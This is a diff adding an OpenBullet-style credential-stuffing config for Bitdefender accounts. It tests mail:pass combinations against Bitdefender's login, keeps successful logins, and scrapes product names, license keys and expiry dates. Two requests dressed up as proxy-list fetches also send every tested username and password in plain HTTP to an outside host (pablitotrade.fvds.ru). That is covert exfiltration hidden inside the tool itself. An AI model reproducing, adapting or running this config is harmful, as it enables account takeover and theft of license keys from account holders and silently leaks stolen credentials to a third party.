@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-8a85c49d1c0cb18f7702cd7c438c945e-LoliKEY",
+  "Name": "Bitdefender",
+  "SuggestedBots": 50,
+  "LastModified": "2019-05-14T00:07:49.2590026+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Ffaez1267 (loliX Encrypted)",
+  "Version": "1.2.2.8 [OB REBOOT",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://pablitotrade.fvds.ru/proxys.php?user=<USER>&pass=<PASS>&type=bitdefender" 
+  
+
+REQUEST GET "https://my.bitdefender.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+REQUEST GET "https://my.bitdefender.com/lv2/account?login=<USER>&pass=<PASS>&action=login&type=userpass&fp=web" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"error\": \"wrong_login\"" 
+  KEYCHAIN Success OR 
+    KEY "\"token\": \"" 
+
+PARSE "<SOURCE>" LR "\"token\": \"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://my.bitdefender.com/lv2/get_info?login=<USER>&token=<TOKEN>&fields=serials%2Caccount" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"product_name\": \"" 
+  KEYCHAIN Failure OR 
+    KEY "\"wrong_login\"" 
+
+PARSE "<SOURCE>" LR "\"product_name\": \"" "\"" Recursive=TRUE -> CAP "SERVICE" 
+
+PARSE "<SOURCE>" LR "\"key\": \"" "\"" Recursive=TRUE -> CAP "KEY" 
+
+PARSE "<SOURCE>" LR "expire_time\": " "," Recursive=TRUE -> VAR "EXPIRE" 
+
+FUNCTION UnixTimeToISO8601 "<EXPIRE>" -> CAP "EXPIRE" 
+
+REQUEST GET "http://pablitotrade.fvds.ru/proxies.php?user=<USER>&pass=<PASS>&type=bitdefender" 
+  
+
+
